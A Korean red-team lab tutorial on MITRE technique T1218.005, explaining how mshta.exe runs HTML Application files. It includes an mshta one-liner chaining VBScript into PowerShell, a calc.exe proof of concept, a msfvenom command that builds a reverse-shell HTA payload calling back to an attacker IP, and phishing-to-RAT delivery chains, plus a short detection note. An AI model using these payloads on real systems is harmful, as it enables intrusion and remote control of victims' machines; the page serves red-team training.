---
description: T1218.005
---

# HTA

## HTA란?

HTA (HTML Application)는 마이크로소프트가 개발한 웹 애플리케이션 프로그래밍 기술이다.HTA 확장자 파일은 Mshta.exe 윈도우 바이너리로 실행되며 네트워크 프록시 인식 방식으로 HTML에 포함된 Windows 스크립트 호스트 코드(VBScript 및 JScript)를 실행할 수 있기 때문에 MS로 서명된 유틸리티를 통해 임의 스크립트 코드 실행을 할 수 있어 공격하기 매력적인(?!?) 수단이다.

아래 트윗은 한 레드팀원이 몇일전에 올린 HTA를 관한 초기 침투가 아직도 많이 쓰이고 있다는것을 알수있다.

![](<../../.gitbook/assets/Pasted image 20230501172222.png>)

### 보안적인 측면

일단 HTA는 Java applet 이나 액티브X 컨트롤과 같은 기존의 웹 애플리케이션 기술에 비해 보안성과 사용자 경험 측면에서 우수한 성능을 제공할 수 있지만 또한 양날의 검으로 기존 웹 앱과는 다르게 로컬 파일 시스템이나 레지스트리 같은 거에 직접 액세스할 수도 있기 때문에더 많은 권한을 가질 수 있기 때문에 악의적인 목적으로도 충분히 쓰일 수 있다.

아래 실습 예제는 굉장히 간단히 예제임으로 "왜 제가 만든 악성 hta 파일이 다운받은 즉시 사라지나요?"와 같은 질문은 하지 말길 바란다. 기본적으로 윈도우 디펜더를 다 끄고 진행하고 있기 때문에 아래 실습은 방어 우회를 거의 일체 생각하지 않았다라는 점을 이해해주길 바란다.

Mitre Attack에서도 Mshta 실행을 하나의 테크닉으로 설명하고 있으며 굉장히 많은 APT그룹도 사용하고 있는 것을 알 수 있다.

{% embed url="https://attack.mitre.org/techniques/T1218/005/" %}

일단 시작하기 앞서, 아래와 같이 mshta -> VBScript-> powershell.exe를 통해, "Hello GROOT!" 아웃풋되는지 확인해보자.

```powershell
mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20GROOT!;Start-Sleep%20-Seconds%205"""))</script>'"
```

![](<../../.gitbook/assets/Pasted image 20230501210226.png>)

### 실습

기본적으로 HTA를 사용한 악성 코드 실행 시나리오는 여러가지가 있을 수 있다. 수 많은 조합들이 있지만, 자주 사용 되는 조합은 다음과 같다:

* LNK -> CMD -> Powershell -> RAT
* ZIP -> Password protected PDF + "password.lnk" -> RAT
* DOCx -> LNK -> remote HTA -> Powershell -> RAT
* 피싱 이메일 -> LOTS를 통한 mediafire/dropbx/github 다운 -> ZIP 파일 -> HTA -> RAT

### 기본 HTA 스크립트 예제

아래 HTA 스크립트는 Windows에서 calc.exe를 실행한다.

**grootcalc.hta**

```
<html>
<body>
<script>
        var c= 'calc.exe'
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

HTML Application을 통해 계산기가 실행되는 것을 알 수 있다.&#x20;

### Metasploit 예제

가장 간단하게 msfvenom을 통해 HTA Payload를 만들어 보자. shell\_reverse\_tcp HTA 페이로드를 만들어 준다.

* LHOST: 칼리 로컬 호스트 로컬 IP
* LPORT: Listener 포트

```
┌──(kali㉿kali)-[~/redteam/HTA/unicorn]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.131 LPORT=443 -f hta-psh -o groot.hta
```

공격자는 타겟이 악성 HTA를 다운받을 수 있게 Python HTTP Server를 포트 8080에 만들어 준다.

<figure><img src="../../.gitbook/assets/Pasted image 20230501175738.png" alt=""><figcaption></figcaption></figure>

브라우저에서 http://192.168.137\[.]131:8080/groot.hta 를 방문하여 파일을 다운받고 실행하면 타겟박스 (윈도우) 쉘을 얻을 수 있다.

![](<../../.gitbook/assets/Pasted image 20230501175551.png>)

### 대응 방안

* CMD에서 실행되는 난독화된 스크립트를 실행하는 mshta.exe는 이미 수상하기 때문에 아마 EDR 차원에서 이미 감지를 할수 있다. 또한 mshta.exe 실행 전후 실행도는 Process들을 살펴봐 .hta 파일의 출처와 목적을 확인하는 것이 중요하다.

### 레퍼런스

{% embed url="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files" %}

{% embed url="https://hatching.io/blog/lnk-hta-polyglot/" %}
